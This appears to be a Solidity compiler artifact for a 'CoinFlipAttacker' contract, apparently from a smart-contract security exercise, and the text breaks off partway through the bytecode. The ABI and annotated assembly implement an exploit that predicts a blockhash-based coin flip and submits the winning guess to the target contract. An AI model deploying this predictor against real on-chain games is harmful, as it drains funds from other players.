{
	"contract/security/CoinFlipAttacker.sol": {
		"CoinFlipAttacker": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_addr",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attackByCall",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackByIns",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "attackByInterface",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contract/security/CoinFlipAttacker.sol\":1159:2498  contract CoinFlipAttacker{\r... */\n  mstore(0x40, 0x80)\n    /* \"contract/security/CoinFlipAttacker.sol\":1335:1412  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"contract/security/CoinFlipAttacker.sol\":1318:1412  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x03\n  sstore\n    /* \"contract/security/CoinFlipAttacker.sol\":1421:1571  constructor(address _addr) public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  0x20\n  dup2\n  lt\n  iszero\n  tag_2\n  jumpi\n  0x00\n  dup1\n  revert\ntag_2:\n  dup2\n  add\n  swap1\n  dup1\n  dup1\n  mload\n  swap1\n  0x20\n  add\n  swap1\n  swap3\n  swap2\n  swap1\n  pop\n  pop\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1473:1478  _addr */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1466:1470  addr */\n  0x00\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1466:1478  addr = _addr */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1507:1512  _addr */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1489:1495  cf_ins */\n  0x01\n  0x00\n    /* \"contract/security/CoinFlipAttacker.sol\":1489:1513  cf_ins = CoinFlip(_addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1557:1562  _addr */\n  dup1\n    /* \"contract/security/CoinFlipAttacker.sol\":1524:1536  cf_interface */\n  0x02\n  0x00\n    /* \"contract/security/CoinFlipAttacker.sol\":1524:1563  cf_interface = CoinFlipInterface(_addr) */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1421:1571  constructor(address _addr) public {\r... */\n  pop\n    /* \"contract/security/CoinFlipAttacker.sol\":1159:2498  contract CoinFlipAttacker{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contract/security/CoinFlipAttacker.sol\":1159:2498  contract CoinFlipAttacker{\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1a13ff68\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x83e00525\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xb6f02db9\n      eq\n      tag_5\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contract/security/CoinFlipAttacker.sol\":2358:2493  function attackByCall() public {\r... */\n    tag_3:\n      tag_6\n      tag_7\n      jump\t// in\n    tag_6:\n      stop\n        /* \"contract/security/CoinFlipAttacker.sol\":2019:2117  function attackByIns() public {\r... */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"contract/security/CoinFlipAttacker.sol\":2203:2313  function attackByInterface() public {\r... */\n    tag_5:\n      tag_10\n      tag_11\n      jump\t// in\n    tag_10:\n      stop\n        /* \"contract/security/CoinFlipAttacker.sol\":2358:2493  function attackByCall() public {\r... */\n    tag_7:\n        /* \"contract/security/CoinFlipAttacker.sol\":2400:2409  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":2412:2421  getFlip() */\n      tag_13\n        /* \"contract/security/CoinFlipAttacker.sol\":2412:2419  getFlip */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":2412:2421  getFlip() */\n      jump\t// in\n    tag_13:\n        /* \"contract/security/CoinFlipAttacker.sol\":2400:2421  bool side = getFlip() */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2432:2436  addr */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2432:2441  addr.call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2479:2483  side */\n      dup2\n        /* \"contract/security/CoinFlipAttacker.sol\":2442:2484  abi.encodeWithSignature(\"flip(bool)\",side) */\n      add(0x24, mload(0x40))\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0x1d263f6700000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2432:2485  addr.call(abi.encodeWithSignature(\"flip(bool)\",side)) */\n      mload(0x40)\n      dup1\n      dup3\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n    tag_15:\n      0x20\n      dup4\n      lt\n      tag_17\n      jumpi\n      dup1\n      mload\n      dup3\n      mstore\n      0x20\n      dup3\n      add\n      swap2\n      pop\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      0x20\n      dup4\n      sub\n      swap3\n      pop\n      jump(tag_15)\n    tag_17:\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      dup1\n      not\n      dup3\n      mload\n      and\n      dup2\n      dup5\n      mload\n      and\n      dup1\n      dup3\n      or\n      dup6\n      mstore\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_20\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_19)\n    tag_20:\n      0x60\n      swap2\n      pop\n    tag_19:\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2358:2493  function attackByCall() public {\r... */\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":2019:2117  function attackByIns() public {\r... */\n    tag_9:\n        /* \"contract/security/CoinFlipAttacker.sol\":2060:2069  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":2072:2081  getFlip() */\n      tag_22\n        /* \"contract/security/CoinFlipAttacker.sol\":2072:2079  getFlip */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":2072:2081  getFlip() */\n      jump\t// in\n    tag_22:\n        /* \"contract/security/CoinFlipAttacker.sol\":2060:2081  bool side = getFlip() */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2092:2098  cf_ins */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2092:2103  cf_ins.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contract/security/CoinFlipAttacker.sol\":2104:2108  side */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":2092:2109  cf_ins.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_26\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_26:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2019:2117  function attackByIns() public {\r... */\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":2203:2313  function attackByInterface() public {\r... */\n    tag_11:\n        /* \"contract/security/CoinFlipAttacker.sol\":2250:2259  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":2262:2271  getFlip() */\n      tag_28\n        /* \"contract/security/CoinFlipAttacker.sol\":2262:2269  getFlip */\n      tag_14\n        /* \"contract/security/CoinFlipAttacker.sol\":2262:2271  getFlip() */\n      jump\t// in\n    tag_28:\n        /* \"contract/security/CoinFlipAttacker.sol\":2250:2271  bool side = getFlip() */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2282:2294  cf_interface */\n      0x02\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contract/security/CoinFlipAttacker.sol\":2282:2299  cf_interface.flip */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x1d263f67\n        /* \"contract/security/CoinFlipAttacker.sol\":2300:2304  side */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":2282:2305  cf_interface.flip(side) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_29:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_32\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_32:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":2203:2313  function attackByInterface() public {\r... */\n      pop\n      jump\t// out\n        /* \"contract/security/CoinFlipAttacker.sol\":1696:1942  function getFlip() private returns (bool) {\r... */\n    tag_14:\n        /* \"contract/security/CoinFlipAttacker.sol\":1732:1736  bool */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1749:1767  uint256 blockValue */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1807  block.number.sub(1) */\n      tag_34\n        /* \"contract/security/CoinFlipAttacker.sol\":1805:1806  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1800  block.number */\n      number\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1804  block.number.sub */\n      tag_35\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":1788:1807  block.number.sub(1) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_34:\n        /* \"contract/security/CoinFlipAttacker.sol\":1778:1808  blockhash(block.number.sub(1)) */\n      blockhash\n        /* \"contract/security/CoinFlipAttacker.sol\":1770:1809  uint256(blockhash(block.number.sub(1))) */\n      0x00\n      shr\n        /* \"contract/security/CoinFlipAttacker.sol\":1749:1809  uint256 blockValue = uint256(blockhash(block.number.sub(1))) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1820:1836  uint256 coinFlip */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1861  blockValue.div(FACTOR) */\n      tag_36\n        /* \"contract/security/CoinFlipAttacker.sol\":1854:1860  FACTOR */\n      sload(0x03)\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1849  blockValue */\n      dup4\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1853  blockValue.div */\n      tag_37\n      swap1\n        /* \"contract/security/CoinFlipAttacker.sol\":1839:1861  blockValue.div(FACTOR) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_36:\n        /* \"contract/security/CoinFlipAttacker.sol\":1820:1861  uint256 coinFlip = blockValue.div(FACTOR) */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1872:1881  bool side */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1896:1897  1 */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1892  coinFlip */\n      dup3\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1897  coinFlip == 1 */\n      eq\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1912  coinFlip == 1 ? true : false */\n      tag_38\n      jumpi\n        /* \"contract/security/CoinFlipAttacker.sol\":1907:1912  false */\n      0x00\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1912  coinFlip == 1 ? true : false */\n      jump(tag_39)\n    tag_38:\n        /* \"contract/security/CoinFlipAttacker.sol\":1900:1904  true */\n      0x01\n        /* \"contract/security/CoinFlipAttacker.sol\":1884:1912  coinFlip == 1 ? true : false */\n    tag_39:\n        /* \"contract/security/CoinFlipAttacker.sol\":1872:1912  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1930:1934  side */\n      dup1\n        /* \"contract/security/CoinFlipAttacker.sol\":1923:1934  return side */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"contract/security/CoinFlipAttacker.sol\":1696:1942  function getFlip() private returns (bool) {\r... */\n      swap1\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_35:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1332:1339  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      tag_41\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1362:1363  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1365:1366  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1361  sub */\n      tag_42\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1358:1401  sub(a, b, \"SafeMath: subtraction overflow\") */\n      jump\t// in\n    tag_41:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1351:1401  return sub(a, b, \"SafeMath: subtraction overflow\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1274:1408  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_37:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3091:3098  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      tag_44\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3121:3122  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3124:3125  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      mload(0x40)\n      dup1\n      0x40\n      add\n      0x40\n      mstore\n      dup1\n      0x1a\n      dup2\n      mstore\n      0x20\n      add\n      0x536166654d6174683a206469766973696f6e206279207a65726f000000000000\n      dup2\n      mstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3120  div */\n      tag_45\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3117:3156  div(a, b, \"SafeMath: division by zero\") */\n      jump\t// in\n    tag_44:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3110:3156  return div(a, b, \"SafeMath: division by zero\") */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3033:3163  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_42:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1778:1785  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1810:1811  a */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1806  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1805:1811  b <= a */\n      gt\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1813:1825  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1797:1826  require(b <= a, errorMessage) */\n      swap1\n      tag_47\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_48:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_50\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_48)\n    tag_50:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_51\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_51:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_47:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1845  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1852:1853  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1849  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1848:1853  a - b */\n      sub\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1836:1853  uint256 c = a - b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1871:1872  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1864:1872  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":1692:1879  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n    tag_45:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3724:3731  uint256 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3821:3822  0 */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3818  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3817:3822  b > 0 */\n      gt\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3824:3836  errorMessage */\n      dup3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3809:3837  require(b > 0, errorMessage) */\n      swap1\n      tag_53\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup4\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_54:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_56\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_54)\n    tag_56:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      swap1\n      dup2\n      add\n      swap1\n      0x1f\n      and\n      dup1\n      iszero\n      tag_57\n      jumpi\n      dup1\n      dup3\n      sub\n      dup1\n      mload\n      0x01\n      dup4\n      0x20\n      sub\n      0x0100\n      exp\n      sub\n      not\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n    tag_57:\n      pop\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_53:\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3856  uint256 c */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3863:3864  b */\n      dup4\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3860  a */\n      dup6\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3859:3864  a / b */\n      dup2\n      tag_58\n      jumpi\n      invalid\n    tag_58:\n      div\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3847:3864  uint256 c = a / b */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3968:3969  c */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3961:3969  return c */\n      swap2\n      pop\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol\":3638:3976  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {... */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220472440feb7c915c1829ba2290c8732c55c57dc31af063220e0fedf42591026ca64736f6c634300060c0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060035534801561003457600080fd5b5060405161073a38038061073a8339818101604052602081101561005757600080fd5b8101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506106008061013a6000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80631a13ff681461004657806383e0052514610050578063b6f02db91461005a575b600080fd5b61004e610064565b005b6100586101d7565b005b610062610299565b005b600061006e61035b565b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16816040516024018082151581526020019150506040516020818303038152906040527f1d263f67000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b6020831061016a5780518252602082019150602081019050602083039250610147565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d80600081146101cc576040519150601f19603f3d0116820160